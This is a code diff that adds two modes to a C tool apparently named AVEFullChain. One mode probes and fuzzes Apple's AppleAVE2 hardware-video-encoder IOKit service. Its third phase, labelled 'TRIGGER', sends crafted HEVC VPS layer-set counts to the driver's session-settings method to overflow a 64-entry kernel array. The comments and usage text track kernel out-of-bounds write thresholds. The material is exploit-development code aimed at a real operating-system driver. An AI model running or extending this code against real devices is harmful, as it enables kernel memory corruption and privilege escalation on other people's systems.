@@ -43,6 +43,7 @@
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
 #include <CoreMedia/CoreMedia.h>
+#include <IOKit/IOKitLib.h>
 
 typedef struct __IOSurface *IOSurfaceRef;
 typedef uint32_t IOSurfaceID;
@@ -3854,6 +3855,385 @@ cleanup_dummies:
         VTCompressionSessionInvalidate(s);
         CFRelease(s);
 
+    } else if (strcmp(mode, "iokit_vps") == 0) {
+        /*
+         * iokit_vps — Direct IOKit probe of AppleAVE2 service
+         *
+         * Session 28 breakthrough: The VPS counter does NOT accumulate through
+         * VTCompressionSession. The fix (AVE_HEVC_CheckVPSExtBounds) adds bounds
+         * checks on VPS extension arrays (dim 64) during sAddClient parsing.
+         * The overflow requires a crafted VPS with vps_num_layer_sets_minus1 > 63.
+         *
+         * This mode:
+         * 1. Opens AppleAVE2 IOKit service directly
+         * 2. Enumerates external methods and their input sizes
+         * 3. Tests sAddClient (selector 0) with a standard session first
+         * 4. Attempts sSessionSettings (selector 3) with crafted VPS config
+         *
+         * Usage: iokit_vps [phase]
+         *   phase 1: Enumerate service + test normal session (safe)
+         *   phase 2: Probe sSessionSettings with VPS extension data
+         *   phase 3: Craft VPS with 65+ layer sets (TRIGGER)
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 1;
+        rlog("=== IOKit Direct VPS Probe (Phase %d) ===\n\n", phase);
+
+        /* Step 1: Find and open AppleAVE2 service */
+        io_service_t service = IOServiceGetMatchingService(
+            kIOMasterPortDefault,
+            IOServiceMatching("AppleAVE2Driver"));
+        if (!service) {
+            service = IOServiceGetMatchingService(
+                kIOMasterPortDefault,
+                IOServiceMatching("AppleAVE2"));
+        }
+        if (!service) {
+            /* Try iterating to find the actual service name */
+            rlog("AppleAVE2Driver/AppleAVE2 not found, searching...\n");
+            io_iterator_t iter;
+            kern_return_t kr = IOServiceGetMatchingServices(
+                kIOMasterPortDefault,
+                IOServiceMatching("IOService"),
+                &iter);
+            if (kr == KERN_SUCCESS) {
+                io_service_t svc;
+                int found = 0;
+                while ((svc = IOIteratorNext(iter)) != 0) {
+                    io_name_t name;
+                    IORegistryEntryGetName(svc, name);
+                    if (strstr(name, "AVE") || strstr(name, "ave") ||
+                        strstr(name, "VideoEncoder")) {
+                        rlog("  Found: %s\n", name);
+                        if (!found) { service = svc; found = 1; }
+                        else IOObjectRelease(svc);
+                    } else {
+                        IOObjectRelease(svc);
+                    }
+                }
+                IOObjectRelease(iter);
+            }
+        }
+
+        if (!service) {
+            rlog("ERROR: Could not find AppleAVE2 IOKit service\n");
+            rlog("This may require a VTCompressionSession to be active first\n");
+            goto done;
+        }
+
+        io_name_t svc_name;
+        IORegistryEntryGetName(service, svc_name);
+        rlog("Found service: %s\n", svc_name);
+
+        /* Get service properties */
+        CFMutableDictionaryRef props = NULL;
+        IORegistryEntryCreateCFProperties(service, &props,
+            kCFAllocatorDefault, 0);
+        if (props) {
+            rlog("Service has properties dict\n");
+
+            /* Look for IOUserClientClass */
+            CFTypeRef uc_class = CFDictionaryGetValue(props,
+                CFSTR("IOUserClientClass"));
+            if (uc_class && CFGetTypeID(uc_class) == CFStringGetTypeID()) {
+                char buf[256];
+                CFStringGetCString(uc_class, buf, sizeof(buf),
+                    kCFStringEncodingUTF8);
+                rlog("IOUserClientClass: %s\n", buf);
+            }
+
+            CFRelease(props);
+        }
+
+        /* Open user client connection */
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+        rlog("IOServiceOpen: kr=0x%x conn=%u\n", kr, conn);
+
+        if (kr != KERN_SUCCESS) {
+            rlog("Failed to open user client (0x%x)\n", kr);
+            rlog("Common reasons:\n");
+            rlog("  - Service requires entitlement\n");
+            rlog("  - Service is already opened by mediaserverd\n");
+            rlog("  - Need to match via VTCompressionSession first\n\n");
+
+            /* Try opening via VTCompressionSession to get mediaserverd's connection */
+            rlog("--- Fallback: Create VTCompressionSession + probe IOKit ---\n");
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+                NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+
+            if (st == noErr && s) {
+                rlog("VTCompressionSession created (keeps mediaserverd's IOKit session alive)\n");
+
+                /* Now try to find IOKit connection details */
+                rlog("\nProbing IOKit registry for AVE user clients...\n");
+
+                io_iterator_t child_iter;
+                kern_return_t kr2 = IORegistryEntryGetChildIterator(
+                    service, kIOServicePlane, &child_iter);
+                if (kr2 == KERN_SUCCESS) {
+                    io_service_t child;
+                    while ((child = IOIteratorNext(child_iter)) != 0) {
+                        io_name_t cname;
+                        IORegistryEntryGetName(child, cname);
+                        rlog("  Child: %s\n", cname);
+                        IOObjectRelease(child);
+                    }
+                    IOObjectRelease(child_iter);
+                }
+
+                /* Encode one frame to fully initialize the hardware path */
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime,
+                    kCFBooleanTrue);
+                int kf = 1;
+                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+                VTSessionSetProperty(s,
+                    kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+                CFRelease(kfn);
+
+                g_encode_done = 0;
+                encode_one(s, 0, 128, 128);
+                for (int w = 0; w < 500 && !g_encode_done; w++) usleep(10000);
+                rlog("First encode: status=%d psets=%zu bytes=%zu\n",
+                    (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+
+                /* Now try IOServiceOpen again - maybe the service is now warm */
+                io_connect_t conn2 = 0;
+                kr = IOServiceOpen(service, mach_task_self(), 0, &conn2);
+                rlog("\nRetry IOServiceOpen after VT init: kr=0x%x conn=%u\n", kr, conn2);
+
+                if (kr == KERN_SUCCESS && conn2) {
+                    rlog("SUCCESS: Got IOKit connection!\n");
+                    conn = conn2;
+                } else {
+                    rlog("Still can't open directly (expected - mediaserverd owns it)\n");
+
+                    /* Try different client types */
+                    for (uint32_t ctype = 0; ctype <= 5; ctype++) {
+                        kr = IOServiceOpen(service, mach_task_self(), ctype, &conn2);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("IOServiceOpen type=%u: SUCCESS conn=%u\n", ctype, conn2);
+                            conn = conn2;
+                            break;
+                        }
+                        rlog("IOServiceOpen type=%u: 0x%x\n", ctype, kr);
+                    }
+                }
+
+                if (phase >= 2 && conn) {
+                    rlog("\n--- Phase 2: Probe External Methods ---\n");
+
+                    /* Test each external method selector to discover input sizes */
+                    for (uint32_t sel = 0; sel <= 15; sel++) {
+                        uint64_t input[16] = {0};
+                        uint64_t output[16] = {0};
+                        uint32_t out_cnt = 16;
+
+                        kr = IOConnectCallScalarMethod(conn, sel,
+                            input, 0, output, &out_cnt);
+                        rlog("  Selector %u (scalar, 0 in): kr=0x%x out_cnt=%u\n",
+                            sel, kr, out_cnt);
+
+                        /* Also try struct method */
+                        uint8_t struct_in[4096] = {0};
+                        uint8_t struct_out[4096] = {0};
+                        size_t struct_out_sz = sizeof(struct_out);
+
+                        kr = IOConnectCallStructMethod(conn, sel,
+                            struct_in, 64, struct_out, &struct_out_sz);
+                        rlog("  Selector %u (struct, 64 in): kr=0x%x out_sz=%zu\n",
+                            sel, kr, struct_out_sz);
+                    }
+                }
+
+                if (phase >= 3 && conn) {
+                    rlog("\n--- Phase 3: Craft VPS Extension Data ---\n");
+                    rlog("Building VPS with 65 layer sets...\n");
+
+                    /*
+                     * HEVC VPS extension structure fields to overflow:
+                     * - vps_num_layer_sets_minus1: 10 bits, range 0..1023
+                     * - Array at +0x17FB: per-layer-set data, dim 64
+                     * - Array at +0x1A40: output layer set accumulator
+                     * - Array at +0x1A41: 2D per-dimension data, stride 64
+                     *
+                     * We need to encode these in the sSessionSettings
+                     * input structure at the right offsets.
+                     */
+
+                    /* Try sSessionSettings (selector 3) with crafted data */
+                    /* The input structure contains the HEVC configuration
+                     * including VPS data. We need to figure out the layout. */
+
+                    uint8_t settings_buf[16384];
+                    memset(settings_buf, 0, sizeof(settings_buf));
+
+                    /* Write vps_num_layer_sets_minus1 = 65 at various
+                     * candidate offsets in the settings structure */
+                    uint32_t test_vals[] = {65, 128, 255};
+
+                    for (int tv = 0; tv < 3; tv++) {
+                        uint32_t val = test_vals[tv];
+                        rlog("Testing layer_sets=%u...\n", val);
+
+                        /* Try a few likely offsets for the layer set count */
+                        int offsets[] = {4, 8, 0x10, 0x20, 0x40, 0x80, 0x100,
+                            0x1880 + 4}; /* +0x1880 is VPS ext base */
+                        for (int oi = 0; oi < 8; oi++) {
+                            memset(settings_buf, 0, sizeof(settings_buf));
+                            int off = offsets[oi];
+                            if (off + 4 > (int)sizeof(settings_buf)) continue;
+                            memcpy(&settings_buf[off], &val, 4);
+
+                            size_t out_sz = 4096;
+                            uint8_t out_buf[4096] = {0};
+                            kr = IOConnectCallStructMethod(conn, 3,
+                                settings_buf, 4096, out_buf, &out_sz);
+                            rlog("  offset=0x%x: kr=0x%x out_sz=%zu\n",
+                                off, kr, out_sz);
+                        }
+                    }
+                }
+
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            } else {
+                rlog("VTCompressionSession create failed: %d\n", (int)st);
+            }
+        } else {
+            rlog("Direct IOKit connection acquired!\n");
+
+            /* Enumerate selectors */
+            rlog("\n--- Enumerating External Methods ---\n");
+            for (uint32_t sel = 0; sel <= 15; sel++) {
+                uint64_t out[16] = {0};
+                uint32_t out_cnt = 16;
+                kr = IOConnectCallScalarMethod(conn, sel,
+                    NULL, 0, out, &out_cnt);
+                rlog("  Selector %u: kr=0x%x out_cnt=%u\n", sel, kr, out_cnt);
+            }
+        }
+
+        if (conn) IOServiceClose(conn);
+        IOObjectRelease(service);
+
+    } else if (strcmp(mode, "iokit_enum") == 0) {
+        /*
+         * iokit_enum — Enumerate ALL IOKit services related to video encoding
+         * This helps discover the exact service name and hierarchy.
+         */
+        rlog("=== IOKit Video Encoder Service Enumeration ===\n\n");
+
+        /* Search for AVE-related services */
+        const char *search_terms[] = {
+            "AVE", "VideoEncoder", "AppleAVE", "H265", "HEVC",
+            "MediaCodec", "VideoCodec", NULL
+        };
+
+        io_iterator_t iter;
+        kern_return_t kr = IOServiceGetMatchingServices(
+            kIOMasterPortDefault,
+            IOServiceMatching("IOService"),
+            &iter);
+
+        if (kr != KERN_SUCCESS) {
+            rlog("Failed to get IOService iterator: 0x%x\n", kr);
+            goto done;
+        }
+
+        io_service_t svc;
+        int found_count = 0;
+        while ((svc = IOIteratorNext(iter)) != 0) {
+            io_name_t name;
+            IORegistryEntryGetName(svc, name);
+
+            int match = 0;
+            for (int i = 0; search_terms[i]; i++) {
+                if (strcasestr(name, search_terms[i])) {
+                    match = 1;
+                    break;
+                }
+            }
+
+            if (match) {
+                found_count++;
+                rlog("[%d] %s\n", found_count, name);
+
+                /* Get class name */
+                io_name_t class_name;
+                IOObjectGetClass(svc, class_name);
+                rlog("    Class: %s\n", class_name);
+
+                /* Get path */
+                io_string_t path;
+                if (IORegistryEntryGetPath(svc, kIOServicePlane, path) == KERN_SUCCESS) {
+                    rlog("    Path: %s\n", path);
+                }
+
+                /* Get properties */
+                CFMutableDictionaryRef props = NULL;
+                IORegistryEntryCreateCFProperties(svc, &props,
+                    kCFAllocatorDefault, 0);
+                if (props) {
+                    CFTypeRef uc = CFDictionaryGetValue(props,
+                        CFSTR("IOUserClientClass"));
+                    if (uc && CFGetTypeID(uc) == CFStringGetTypeID()) {
+                        char buf[256];
+                        CFStringGetCString(uc, buf, sizeof(buf),
+                            kCFStringEncodingUTF8);
+                        rlog("    IOUserClientClass: %s\n", buf);
+                    }
+
+                    CFTypeRef cm = CFDictionaryGetValue(props,
+                        CFSTR("IOClass"));
+                    if (cm && CFGetTypeID(cm) == CFStringGetTypeID()) {
+                        char buf[256];
+                        CFStringGetCString(cm, buf, sizeof(buf),
+                            kCFStringEncodingUTF8);
+                        rlog("    IOClass: %s\n", buf);
+                    }
+
+                    /* Check for external method metadata */
+                    CFTypeRef methods = CFDictionaryGetValue(props,
+                        CFSTR("IOExternalMethodCount"));
+                    if (methods) {
+                        rlog("    Has IOExternalMethodCount\n");
+                    }
+
+                    CFRelease(props);
+                }
+
+                /* Try opening */
+                io_connect_t c = 0;
+                for (uint32_t t = 0; t <= 3; t++) {
+                    kr = IOServiceOpen(svc, mach_task_self(), t, &c);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    IOServiceOpen(type=%u): SUCCESS conn=%u\n", t, c);
+                        IOServiceClose(c);
+                    } else {
+                        rlog("    IOServiceOpen(type=%u): 0x%x\n", t, kr);
+                    }
+                }
+
+                rlog("\n");
+            }
+            IOObjectRelease(svc);
+        }
+        IOObjectRelease(iter);
+
+        rlog("Found %d AVE/video-related services\n", found_count);
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -3890,6 +4270,8 @@ cleanup_dummies:
         rlog("  enum_properties                -- Enumerate ALL supported encoder properties and boundary test\n");
         rlog("  multi_layer [max]              -- MV-HEVC with N layers: measure pset scaling\n");
         rlog("  counter_accumulate [enc] [stereo] -- KEY TEST: 300 keyframes, monitor kernel OOB at 86+\n");
+        rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
+        rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
